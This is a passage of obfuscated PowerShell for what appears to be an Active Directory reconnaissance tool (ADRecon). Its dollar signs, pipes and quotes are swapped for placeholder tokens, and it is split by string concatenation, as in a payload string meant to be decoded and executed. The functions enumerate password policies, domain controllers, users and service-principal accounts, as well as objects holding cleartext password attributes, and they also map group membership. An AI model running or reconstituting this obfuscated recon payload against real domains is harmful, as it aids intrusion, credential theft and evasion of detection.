            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajPCI DSS RequirementI2aj -Value 5I7'+'ELObjValues[5I7ELi+2]
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajPCI DSS v3.2.1I2aj -Value 5I7ELObjValues[5I7ELi+3]
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajASD ISMI2aj -Value 5I7ELObjValues[5I7ELi+4]
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2aj2018 ISM ControlsI2aj -Value 5I7ELObjValues[5I7ELi+5]
            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajCIS Benchmark 2016I2aj -Value 5I7ELObjValues[5I7ELi+6]
            5I7ELi += 6
            5I7ELADPassPolObj += 5I7ELObj
        }
        Remove-Variable ObjValues
        Return 5I7ELADPassPolObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRFineGrainedPasswordPo'+'licy
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password PolicyI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADFinepasspolicy)
        {
            5I7ELADPassPolObj = @()

            5I7ELADFinepasspolicy Ok6rl ForEach-Object {
                For(5I7ELi=0; 5I7ELi -lt 5I7EL(5I7EL_.AppliesTo.Count); 5I7ELi++)
                {
                    5I7ELAppliesTo = 5I7ELAppliesTo + I2aj,I2aj + 5I7EL_.AppliesTo[5I7ELi]
                }
                If (5I7ELnull -ne 5I7ELAppliesTo)
                {
                    5I7ELAppliesTo = 5I7ELAppliesTo.TrimStart(I2aj,I2aj)
                }
                5I7ELObjValues = @(I2ajNameI2aj, 5I7EL(5I7EL_.Name), I2ajApplies ToI2aj, 5I7ELAppliesTo, I2ajEnforce password historyI2aj, 5I7EL_.PasswordHistoryCount, I2ajMaximum password age (days)I2aj, 5I7EL_.MaxPasswordAge.days, I2ajMinimum password age (days)I2aj, 5I7EL_.MinPasswordAge.days, I2ajMinimum password lengthI2aj, 5I7EL_.MinPasswordLength, I2ajPassword must meet complexity requirementsI2aj, 5I7EL_.ComplexityEnabled, I2ajStore password using reversible encryptionI2aj, 5I7EL_.ReversibleEncryptionEnabled, I2ajAccount lockout duration (mins)I2aj, 5I7EL_.LockoutDuration.minutes, I2ajAccount lockout thresholdI2aj, 5I7EL_.LockoutThreshold, I2ajReset account lockout counter after (mins)I2aj, 5I7EL_.LockoutObservationWindow.minutes, I2ajPrecedenceI2aj, 5I7EL(5I7EL_.Precedence))
                For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
                {
                    5I7ELObj = New-Object PSObject
                  '+'  5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajPolicyI2aj -Value 5I7ELObjValues[5I7ELi]
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
                    5I7ELi++
                    5I7ELADPassPolObj += 5I7ELObj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (5I7ELObjDomain)
        {
            5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
            5I7ELObjSearcher.PageSize = 5I7ELPageSize
            5I7ELObjSearcher.Filter = I2aj(objectClass=msDS-PasswordSettings)I2aj
            5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
            Try
            {
                5I7ELADFinepasspolicy = 5I7ELObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password PolicyI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }

            If (5I7ELADFinepasspolicy)
            {
                If ([ADRecon.LDAPClass]::ObjectCount(5I7ELADFinepasspolicy) -ge 1)
                {
                    5I7ELADPassPolObj = @()
                    '+'5I7ELADFinepasspolicy Ok6rl ForEach-Object {
                    For(5I7ELi=0; 5I7ELi -lt 5I7EL(5I7EL_.Properties.JQTOymsds-psoappliestoJQTOy.Count); 5I7ELi++)
                    {
                        5I7ELAppliesTo = 5I7ELAppliesTo + I2aj,I2aj + 5I7EL_.Properties.JQTOymsds-psoappliestoJQTOy[5I7ELi]
                    }
                    If (5I7ELnull -ne 5I7ELAppliesTo)
                    {
                        5I7ELAppliesTo = 5I7ELAppliesTo.TrimStart(I2aj,I2aj)
                    }
                        5I7ELObjValues = @(I2ajNameI2aj, 5I7EL(5I7EL_.Properties.name), I2ajApplies ToI2aj, 5I7ELAppliesTo, I2ajEnforce password historyI2aj, 5I7EL(5I7EL_.Properties.JQTOymsds-passwordhistorylengthJQTOy), I2ajMaximum password age (days)I2aj, 5I7EL(5I7EL(5I7EL_.Properties.JQTOymsds-maximumpasswordageJQTOy) /-864000000000), I2ajMinimum password age (days)I2aj, 5I7EL(5I7EL(5I7EL_.Properties.JQTOymsds-minimumpasswordageJQTOy) /-864000000000), I2ajMinimum password lengthI2aj, 5I7EL(5I7EL_.Properties.JQTOymsds-minimumpasswordlengthJQTOy), I2ajPassword must meet complexity requirementsI2aj, 5I7EL(5I7EL_.Properties.JQTOym'+'sds-passwordcomplexityenabledJQTOy), I2ajStore password using reversible encryptionI2aj, 5I7EL(5I7EL_.Properties.JQTOymsds-passwordreversibleencryptionenabledJQTOy), I2ajAccount lockout duration (mins)I2aj, 5I7EL(5I7EL(5I7EL_.Properties.JQTOymsds-lockoutdurationJQTOy)/-600000000), I2ajAccount lockout thresholdI2aj'+', 5I7EL(5I7EL_.Properties.JQTOymsds-lockoutthresholdJQTOy), I2ajReset account lockout counter after (mins)I2aj, 5I7EL(5I7EL(5I7EL_.Properties.JQTOymsds-lockoutobservationwindowJQTOy)/-600000000), I2ajPrecedenceI2aj, 5I7EL(5I7EL'+'_.Properties.JQTOymsds-passwordsettingsprecedenceJQTOy))
                        For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
                        {
                            5I7ELObj = New-Object PSObject
                            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajPolicyI2aj -Value 5I7ELObjValues[5I7ELi]
                            5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajValueI2aj -Value 5I7ELObjValues[5I7ELi+1]
                            5I7ELi++
                            5I7ELADPassPolObj += 5I7ELObj
          '+'              }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If (5I7ELADPassPolObj)
    {
        Return 5I7ELADPassPolObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRDomainController
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADDomainControllers = @( Get-ADDomainController -Filter * )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRDomainController] Error while enumerating DomainController ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        
        If (5I7ELADDomainControllers)
        {
            Write-Verbose I2aj[*] Total Domain Controllers: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADDomainControllers))I2aj
            5I7ELDCObj = [ADRecon.ADWSClass]::DomainControllerParser(5I7ELADDomainControllers, 5I7ELThreads)
            Remove-Variable ADDomainControllers
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (5I7ELCredential -ne [Management.Automation.'+'PSCredential]::Empty)
        {
            5I7ELDomainFQDN = Get-DNtoFQDN(5I7ELobjDomain.distinguishedName)
            5I7ELDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajDomainI2aj,5I7EL(5I7ELDomainFQDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
            Try
            {
                5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(5I7ELDomainContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRDomainController] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            Remove-Variable DomainContext
        }
        Else
        {
            5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }

        If (5I7ELADDomain.DomainControllers)
        {
            Write-Verbose I2aj[*] Total Domain Controllers: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADDomain.DomainControllers))I2aj
            5I7ELDCObj = [ADRecon.LDAPClass]::DomainControllerParser(5I7ELADDomain.DomainControllers, 5I7ELThreads)
            Remove-Variable ADDomain
        }
    }

    If (5I7ELDCObj)
    {
        Return 5I7ELDCObj
    }
    Else
    {
        Return 5I7ELnull
    }
}

Function Get-ADRUser
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELt'+'rue)]
        [DateTime] 5I7ELdate,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELDormantTimeSpan = 90,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELADRUsers = 5I7ELtrue,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELADRUserSPNs = 5I7ELfalse
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        If (!5I7ELADRUsers)
        {
            Try
            {
                5I7ELADUsers = @( Get-ADObject -LDAPFilter I2aj(&(samAccountType=805306368)(servicePrincipalName=*))I2aj -ResultPageSize 5I7ELPageSize -Properties Name,Description,memberOf,sAMAccountName,servicePri'+'ncipalName,primaryGroupID,pwdLastSet,userAccountControl )
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRUser] Error while enumerating UserSPN ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
        }
        Else
        {
            Try
            {
                5I7ELADUsers = @( Get-ADUser -Filter * -ResultPageSize 5I7ELPageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirectory,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,memberOf,middleName,mobile,JQTOymsDS-AllowedToDelegateToJQTOy,JQTOymsDS-SupportedEncryptionTypesJQTOy,Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,servicePrincipalName,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRUser] Error while enumerating User ObjectsI2aj
                Write-Verbose I2aj[EXCEP'+'TION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
        }
        If (5I7ELADUsers)
        {
            Write-Verbose I2aj[*] Total Users: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADUsers))I2aj
            If (5I7ELADRUsers)
            {
                Try
                {
                    5I7ELADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                    5I7ELPassMaxAge = 5I7ELADpasspolicy.MaxPasswordAge.days
                    Remove-Variable ADpasspolicy
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 daysI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                    5I7ELPassMaxAge = 90
                }
                5I7ELUserObj = [ADRecon.ADWSClass]::UserParser(5I7ELADUsers, 5I7ELdate, 5I7ELDormantTimeSpan, 5I7ELPassMaxAge, 5I7ELThreads)
            }
            If (5I7ELADRUserSPNs)
            {
                5I7ELUserSPNObj = [ADRecon.ADWSClass]::UserSPNParser(5I7ELADUsers, 5I7ELThreads)
            }
            Remove-Variable ADUsers
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        If (!5I7ELADRUsers)
        {
            5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
            5I7ELObjSearcher.PageSize = 5I7ELPageSize
            5I7ELObjSearcher.Filter = I2aj(&(samAccountType=805306368)(servicePrincipalName=*))I2aj
            5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajnameI2aj,I2ajdescriptionI2aj,I2ajmemberofI2aj,I2ajsamaccountnameI2aj,I2ajserviceprincipalnameI2aj,I2ajprimarygroupidI2aj,I2ajpwdlastsetI2aj,I2ajuseraccountcontrolI2aj))
            5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
            Try
            {
                5I7ELADUsers = 5I7ELObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRUser] Error while enumerating UserSPN ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            5I7ELObjSearcher.dispose()
        }
        Else
        {
            5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
            5I7ELObjSearcher.PageSize = 5I7ELPageSize
            5I7ELObjSearcher.Filter = I2aj(samAccountType=805306368)I2aj
            
            5I7ELObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]JQTOyDaclJQTOy
            5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajaccountExpiresI2aj,I2ajadmincountI2aj,I2ajcI2aj,I2ajcanonicalnameI2aj,I2ajcompanyI2aj,I2ajdepartmentI2aj,I2ajdescriptionI2aj,I2ajdistinguishednameI2aj,I2ajgivenNameI2aj,I2ajhomedirectoryI2aj,I2ajinfoI2aj,I2ajlastLogontimestampI2aj,I2ajmailI2aj,I2ajmanagerI2aj,I2ajmemberofI2aj,I2ajmiddleNameI2aj,I2ajmobileI2aj,I2ajmsDS-AllowedToDelegateToI2aj,I2ajmsDS-SupportedEncryptionTypesI2aj,I2ajnameI2aj,I2ajntsecuritydescriptorI2aj,I2ajobjectsidI2aj,I2ajprimarygroupidI2aj,I2ajprofilepathI2aj,I2ajpwdLastSetI2aj,I2ajsamaccountNameI2aj,I2ajscriptpathI2aj,I2ajserviceprincipalnameI2aj,I2ajsidhistoryI2aj,I2ajsnI2aj,I2ajtitleI2aj,I2ajuseraccountcontrolI2aj,I2ajuserworkstationsI2aj,I2ajwhenchangedI2aj,I2ajwhencreatedI2aj))
            5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
            Try
            {
                5I7ELADUsers = 5I7ELObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRUser] Error while enumerating User ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            5I7ELObjSearcher.dispose()
        }
        If (5I7ELADUsers)
        {
'+'            Write-Verbose I2aj[*] Total Users: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADUsers))I2aj
            If (5I7ELADRUsers)
            {
                5I7ELPassMaxAge = 5I7EL(5I7ELObjDomain.ConvertLargeIntegerToInt64(5I7ELObjDomain.maxpwdage.value) /-864000000000)
                If (-Not 5I7ELPassMaxAge'+')
                {
                    Write-Warning I2aj[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 daysI2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                    5I7ELPassMaxAge = 90
                }
                5I7ELUserObj = [ADRecon.LDAPClass]::UserParser(5I7ELADUsers, 5I7ELdate, 5I7ELDormantTimeSpan, 5I7ELPassMaxAge, 5I7EL'+'Threads)
            }
            If (5I7ELADRUserSPNs)
            {
                5I7ELUserSPNObj = [ADRecon.LDAPClass]::UserSPNParser(5I7ELADUsers, 5I7ELThreads)
            }
            Remove-Variable ADUsers
        }
    }

    If (5I7ELUserObj)
    {
        Export-ADR -ADRObj 5I7ELUserObj -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajUsersI2aj
        Remove-Variable UserObj
    }
    If (5I7ELUserSPNObj)
    {
        Export-ADR -ADRObj 5I7ELUserSPNObj -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajUserSPNsI2aj
        Remove-Variable UserSPNObj
    }
}


Function Get-ADRPasswordAttributes
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADUsers = Get-ADObject -LDAPFilter JQTOy(Ok6rl(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))JQTOy -ResultPageSize 5I7ELPageSize -Properties *
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRPasswordAttributes] Error while enumerating Password AttributesI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADUsers)
        {
            Write-Warning I2aj[*] Total PasswordAttribute Objects: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADUsers))I2aj
            5I7ELUserObj = 5I7ELADUsers
            Remove-Variable ADUsers
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(Ok6rl(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))I2aj
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj
        Try
        {
            5I7ELADUsers = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRPasswordAttributes] Error while enumerating Password AttributesI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADUsers)
        {
            5I7ELcnt = [ADRecon.LDAPClass]::ObjectCount(5I7ELADUsers)
            If (5I7ELcnt -gt 0)
            {
                Write-Warning I2aj[*] Total PasswordAttribute Objects: 5I7ELcntI2aj
  '+'          }
            5I7ELUserObj = 5I7ELADUsers
            Remove-Variable ADUsers
        }
    }

    If (5I7ELUserObj)
    {
        Return 5I7ELUserObj
    }
    Else
    {
     '+'   Return 5I7ELnull
    }
}

Function Get-ADRGroup
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELtrue)]
        [DateTime] 5I7ELdate,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADROutputDir,

        [Para'+'meter(Mandatory = 5I7ELtrue)]
        [array] 5I7ELOutputType,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELADRGroups = 5I7ELtrue,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELADRGroupChanges = 5I7ELfalse
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADGroups = @( Get-ADGroup -Filter * -ResultPageSize 5I7ELPageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,JQTOymsDS-ReplValueMetaDataJQTOy,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroup] Error while enumerating Group ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If (5I7ELADGroups)
        {
            Write-Verbose I2aj[*] Total Groups: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADGroups))I2aj
            If (5I7ELADRGroups)
            {
                5I7ELGroupObj = [ADRecon.ADWSClass]::GroupParser(5I7ELADGroups, 5I7ELThreads)
            }
            If (5I7ELADRGroupChanges)
            {
                5I7ELGroupChangesObj = [ADRecon.ADWSClass]::GroupChangeParser(5I7ELADGroups, 5I7ELdate, 5I7ELThreads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectClass=group)I2aj
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajadmin'+'countI2aj,I2ajcanonicalnameI2aj, I2ajdistinguishednameI2aj, I2ajdescriptionI2aj, I2ajgrouptypeI2aj,I2ajsamaccountnameI2aj, I2ajsidhistoryI2aj, I2ajmanagedbyI2aj, I2ajmsds-replvaluemetadataI2aj, I2ajobjectsidI2aj, I2ajwhencreatedI2aj, I2ajwhenchangedI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            '+'5I7ELADGroups = 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroup] Error while enumerating Group ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADGroups)
        {
            Write-Verbose I2aj[*] Total Groups: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADGroups))I2aj
            If (5I7ELADRGroups)
            {
                5I7ELGroupObj = [ADRecon.LDAPClass]::GroupParser(5I7ELADGroups, 5I7ELThreads)
            }
            If (5I7ELADRGroupChanges)
            {
                5I7ELGroupChangesObj = [ADRecon.LDAPClass]::GroupChangeParser(5I7ELADGroups, 5I7ELdate, 5I7ELThreads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If (5I7ELGroupObj)
    {
        Export-ADR -ADRObj 5I7ELGroupObj -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajGroupsI2aj
        Remove-Variable GroupObj
    }

    If (5I7ELGroupChangesObj)
    {
        Export-ADR -ADRObj 5I7ELGroupChangesObj -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajGroupChangesI2aj
        Remove-Variable GroupChangesObj
    }
}

Function Get-ADRGroupMember
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        Try
        {
            5I7ELADDomain = Get-ADDomain
            5I7ELADDomainSID = 5I7ELADDomain.DomainSID.Value
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroupMember] Error getting Domain ContextI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        Try
        {
            5I7ELADGroups = 5I7ELADGroups = @( Get-ADGroup -Filter * -ResultPageSize 5I7ELPageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroupMember] Error while enumerating Group ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }

        Try
        {
            5I7ELADGroupMembers = @( Get-ADObject -LDAPFilter JQTOy(Ok6rl(memberof=*)(primarygroupid=*))JQTOy -Properties DistinguishedName,ObjectClass,memberof,primaryGroupID,sAMAccountName,samaccounttype )
'+'        }
        Catch
        {
            Write-Warning I2aj[Get-ADRGroupMember] Error while enumerating GroupMember ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }

        If ( (5I7ELADDomainSID) -and (5I7ELADGroups) -and (5I7ELADGroupMembers) )
        {
 '+'           Write-Verbose I2aj[*] Total GroupMember Objects: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELADGroupMembers))I2aj
            5I7ELGroupMemberObj = [ADRecon.ADWSClass]::GroupMemberParser(5I7ELADGroups, 5I7ELADGroupMembers, 5I7ELADDomainSID, 5I7ELThreads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }'+'

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {

        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELDomainFQDN = Get-DNtoFQDN(5I7ELobjDomain.distinguishedName)
            5I7ELDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajDomainI2aj,5I7EL(5I7ELDomainFQDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
            Try
            {
                5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(5I7ELDomainContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRGroupMember] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                Return 5I7ELnull
            }
            Remove-Variable DomainContext
            Try
            {
                5I7ELForestContext = New-Object Syste'+'m.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajForestI2aj,5I7EL(5I7ELADDomain.Forest),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
                5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(5I7ELForestCon'+'text)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRGroupMember] Error getting Forest ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
            If (5I7ELForestContext)
            {
                Remove-Variable ForestContext
            }
            If (5I7ELADForest)
            {
                5I7ELGlobalCatalog = 5I7ELADForest.FindGlobalCatalog()
            }
            If (5I7ELGlobalCatalog)
            {
                5I7ELDN = I2ajGC://5I7EL(5I7ELGlobalCatalog.IPAddress)/5I7EL(5I7ELobjDomain.distinguishedname)I2aj
                Try'+'
                {
                    5I7ELADObject = New-Object -Type'+'Name System.DirectoryServices.DirectoryEntry -ArgumentList (5I7EL(5I7ELDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCredential().password))
                    5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELADObject.objectSid[0], 0)
                    5I7ELADObject.Dispose()
                }
                Catch
                {
                    Write-Warning I2aj[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog 5I7EL(5I7ELGlobalCatalog.IPAddress). Using SID from the ObjDomain.I2aj
                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                    5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELobjDomain.objectSid[0], 0)
                }
            }
            Else
            {
                5I7ELADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(5I7ELobjDomain.objectSid[0], 0)
            }
        }
        Else
        {
            5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                5I7ELGlobalCatalog = 5I7ELADForest.FindGlobalCatalog()
                5I7ELDN = I2ajGC://5I7EL(5I7ELGlobalCatalog)/5I7EL(5I7ELobjDomain.distinguishedname)I2aj
